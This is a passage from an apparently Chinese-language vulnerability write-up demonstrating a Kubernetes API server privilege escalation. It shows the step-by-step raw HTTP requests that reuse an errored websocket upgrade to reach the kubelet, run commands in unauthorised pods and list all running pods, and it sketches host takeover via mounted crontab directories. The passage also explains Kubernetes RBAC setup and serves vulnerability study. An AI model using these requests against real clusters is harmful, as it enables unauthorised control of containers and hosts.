![
](https://images.seebug.org/content/images/2018/12/576ffb88-57ba-4dfe-9bf5-f3ccefeff85e.png-w331s)
### 7 漏洞利用演示
#### 7.1 满足先决条件
先看下正常请求执行的链路是怎么样的：client --> apiserver --> kubelet
即client首先对apiserver发起请求，例如发送请求 [连接某一个容器并执行exec]
，请求首先会被发到apiserver，apiserver收到请求后首先对该请求进行认证校验，如果此时使用的是匿名用户（无任何认证信息），正如上面代码层的分析结果，api
server上是可以通过认证的，但会授权失败，即client只能走到apiserver而到不了kubelet就被返回403并断开连接了。
![
](https://images.seebug.org/content/images/2018/12/5040676b-f088-4a8a-ac5d-3fb6a507a06f.png-w331s)
所以本次攻击的先决条件是，我们需要有一个可以从client到apiserver到kubelet整个链路通信认证通过的用户。
所以在本次分析演示中，我们创建了一个普通权限的用户，该用户只具有role
namespace（新创建的）内的权限，包括对该namespace内pods的exec权限等，对其他namespace无权限。并启用了Bearer
Token 认证模式（认证方式为在请求头加上Authorization: Bearer 1234567890 即可）。
#### 7.2 构造第一次请求
攻击点先决条件满足后，我们需要构造第一个攻击报文，即满足API server
往后端转发（通过HTTP头检测），且后端kubelet会返回失败。先构造一个可以往后端转发的请求，构造消息如下
    192.168.127.80:6443
    GET /api/v1/namespaces/role/pods/test1/exec?command=bash&stderr=true&stdin=true&stdout=true&tty=true HTTP/1.1
    Host: 192.168.127.80:6443
    Authorization: Bearer 1234567890
    Connection: upgrade
    Upgrade: websocket
但是这个消息还不满足我们的要求，因为这个消息到kubelet后可以被成功处理并返回101，然后成功建立一个到我们有权限访问的role下的test容器的wss控制连接，这并不是我们所期待的，我们期待的是获取K8S最高权限，可以连接任意容器，执行任意操作等。
所以我们要改造这个请求，来构造出一个错误的返回，利用错误返回没有被处理导致连接可以继续保持的特性来复用通道打成后面的目的。改造请求如下
    192.168.127.80:6443
    GET /api/v1/namespaces/role/pods/test1/exec HTTP/1.1
    Host: 192.168.127.80:6443
    Authorization: Bearer 1234567890
    Connection: upgrade
    Upgrade: websocket
该请求返回结果为
    HTTP/1.1 400 Bad Request
    Date: Fri, 07 Dec 2018 08:28:34 GMT
    Content-Length: 52
    Content-Type: text/plain; charset=utf-8
    you must specify at least 1 of stdin, stdout, stderr
为什么这么构造，可以产生失败呢？因为exec接口的调用至少要指定标准输入、标准输出或错误输出中的任意一个（正如前面代码分析中所述），所以我们没有对exec接口进行传参即可完成构造。
#### 7.3 构造第二次请求
因为上面错误返回后，API
SERVER没有处理，所以此时我们已经打通了到kubelet的连接，接下来我们就可以利用这个通道来建立与其它pod的exec连接。但是此时如果对kubelet不熟悉的同学在继续攻击是可能会犯这样的错误，例如这样去构造了第二次的攻击报文
    GET /api/v1/namespaces/kube-system/pods/kube-flannel-ds-amd64-v2kgb/exec?command=/bin/hostname&input=1&output=1&tty=0 HTTP/1.1
    Upgrade: websocket
    Connection: Upgrade
    Host: 192.168.127.80:6443
    Origin: http://192.168.127.80:6443
    Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
    Sec-WebSocket-Version: 13
如果这样发送第二个请求来获取其它无权限pod的exec权限时，返回的结果会是如下所示，且通道继续保留
    HTTP/1.1 404 Not Found
    Content-Type: text/plain; charset=utf-8
    X-Content-Type-Options: nosniff
    Date: Fri, 07 Dec 2018 13:14:50 GMT
    Content-Length: 19
    404 page not found
这是因为当前的通道我们的消息是会直接被转发到kubelet上，而不需要对API
server发送exec让他来进行api请求解析处理，所以我们的请求地址不应该是/api/v1/namespaces/kube-system/pods/kube-flannel-ds-amd64-v2kgb/exec而应该是如下所示，直接调用kubelet的内部接口即可，如下所示
    GET /exec/kube-system/kube-flannel-ds-amd64-v2kgb/kube-flannel?command=/bin/hostname&input=1&output=1&tty=0 HTTP/1.1
    Upgrade: websocket
    Connection: Upgrade
    Host: 192.168.127.80:6443
    Origin: http://192.168.127.80:6443
    Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
    Sec-WebSocket-Version: 13
说明下，这个接口中路径的入参是这样的：/exec/{namespace}/{pod}/{container}?command=...
该请求即可获取到我们所期待的结果，如下所示，成功获取到了对其他无权限容器命令执行的结果
    HTTP/1.1 101 Switching Protocols
    Upgrade: websocket
    Connection: Upgrade
    Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
    Sec-WebSocket-Protocol: v4.channel.k8s.io
    ?pegasus03?#{"metadata":{},"status":"Success"}??
#### 7.4 如何获取其它POD信息
在发送第二个报文并完成漏洞攻击的过程中，我们演示攻击了kube-system namespace下的kube-flannel-ds-amd64-v2kgb
pod，那么真实攻击环境下，我们如何获取到其它namespace与pods等信息呢？
因为我们现在已经获取了K8S最高管理权限，所以我们可以直接调用kubelet的内部接口去查询这些信息，例如发送如下请求来获取正在运行的所有pods的详细信息
    GET /runningpods/ HTTP/1.1
    Upgrade: websocket
    Connection: Upgrade
    Host: 192.168.127.80:6443
    Origin: http://192.168.127.80:6443
    Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
    Sec-WebSocket-Version: 13
结果如下
    {"kind":"PodList","apiVersion":"v1","metadata":{},"items":[{"metadata":{"name":"test1","namespace":"role","uid":"f99e2d0a-f907-11e8-8fb9-000c290f37a1","creationTimestamp":null},"spec":{"containers":[{"name":"test","image":"sha256:17a5ba3b1216ccac0f8ee54568ba256619160ff4020243884bc3ed86bf8ae737","resources":{}}]},"status":{}},{"metadata":{"name":"test","namespace":"role","uid":"d4779abc-f907-11e8-8fb9-000c290f37a1","creationTimestamp":null},"spec":{"containers":[{"name":"test","image":"sha256:17a5ba3b1216ccac0f8ee54568ba256619160ff4020243884bc3ed86bf8ae737","resources":{}}]},"status":{}},{"metadata":{"name":"istio-sidecar-injector-6bd4d9487c-fgkds","namespace":"istio-system","uid":"c4fdf537-f23f-11e8-b2db-000c290f37a1","creationTimestamp":null},...省略
#### 7.5 获取K8S权限后如何获取主机权限
这边不再延伸，有兴趣可以具体尝试，例如可以利用K8S新建一个容器，该容器直接挂载系统关键目录，如crontab配置目录等，然后通过写定时任务等方式获取系统权限。
#### 7.6 一个细节
补充一个测试利用过程中的坑，让大家提前了解，避免踩坑。
测试构造第二个请求是，直接在目标主机192.168.127.80上执行下面命令找一个pod的基础信息来进行攻击（没有直接调用/runningpods查询）
    kubectl get namespace
    kubectl -n kube-system get pods
    kubectl -n kube-system get pods kube-flannel-ds-amd64-48sj8 -o json
![
](https://images.seebug.org/content/images/2018/12/d27a95c5-dfe7-4f03-8854-c2193be6f347.png-w331s)
如上图所示，查询返回了3个pod，第一次测试时，直接选择了第一个pod kube-flannel-ds-amd64-48sj8，发送第二个报文后，返回信息如下：
    HTTP/1.1 404 Not Found
    Date: Fri, 07 Dec 2018 14:24:49 GMT
    Content-Length: 18
    Content-Type: text/plain; charset=utf-8
    pod does not exist
提示pod不存在，这个就很奇怪了，仔细校验接口调用是对的，也不会有权限问题，现在的权限实际就是apiserver的权限，默认是具有所有权限了，namespace和pod信息是直接查询到的也不会有错，怎么会pod不存在？
实际原因是这样的，由于我们攻击发送的第一个报文（用来构建一个到kubelet的通道），连接的是role namespace的test
pod，这个pod实际是在节点3而非当前主机节点1（192.168.127.80）上，所以我们的通道直连接的是节点3上的kubelet，因此我们无法直接访问到其它节点上的pod，而上述查询获取到的第一个pod正好是其它节点上的，导致漏洞利用时返回了404。
### 8 相关知识
由于该漏洞涉及K8S、websocket等相关技术细节，下面简单介绍下涉及到的相关知识，辅助理解与分析漏洞。
#### 8.1 K8S权限相关
kubernetes 主要通过 APIServer
对外提供服务，对于这样的系统集群来说，请求访问的安全性是非常重要的考虑因素。如果不对请求加以限制，那么会导致请求被滥用，甚至被黑客攻击。
kubernetes 对于访问 API
来说提供了两个步骤的安全措施：认证和授权。认证解决用户是谁的问题，授权解决用户能做什么的问题。通过合理的权限管理，能够保证系统的安全可靠。
下图是 API 访问要经过的三个步骤，前面两个是认证和授权，第三个是 Admission
Control，它也能在一定程度上提高安全性，不过更多是资源管理方面的作用。
注：只有通过 HTTPS 访问的时候才会通过认证和授权，HTTP 则不需要鉴权
认证授权基本概念请参考：
下面以本次测试建立的普通权限用户的过程为例，简单说说明下k8s环境下如何去新建一个普通权限的用户的基本步骤（详情可以参考：[https://mritd.me/2017/07/17/kubernetes-rbac-chinese-translation）](https://mritd.me/2017/07/17/kubernetes-rbac-chinese-translation%EF%BC%89)
    1、cd /opt/awesome/role/
    2、建一个空间，比如说role
        kubectl create namespace role
    3、创建一个pod
        kubectl create -f test_pod.yaml
    4、创建RBAC规则，给用户组test赋予了list所有namespaces、在namespace role下list/get pods、在namespace role下get pods/exec的权限
        kubectl create -f test_cluster_role.yaml
        kubectl create -f test_cluster_role_binding.yaml
        kubectl create -f test_role.yaml
        kubectl create -f test_role_binding.yaml
    5、创建tokens文件/etc/kubernetes/pki/role-token.csv
    6、令apiserver开启token-auth-file
         在/etc/kubernetes/manifests/kube-apiserver.yaml中加一条--token-auth-file=/etc/kubernetes/pki/role-token.csv
    7、等待apiserver重启，这时候就可以用使用curl测试下权限配置是否生效了，例如
        curl -k  --header "Authorization: Bearer {你配置的token}" https://192.168.127.80:6443/api/v1/namespaces/role/pods以test-role用户来list在namespace role下的pods
相关配置文件
    [root@pegasus01 role]# cat test_cluster_role_binding.yaml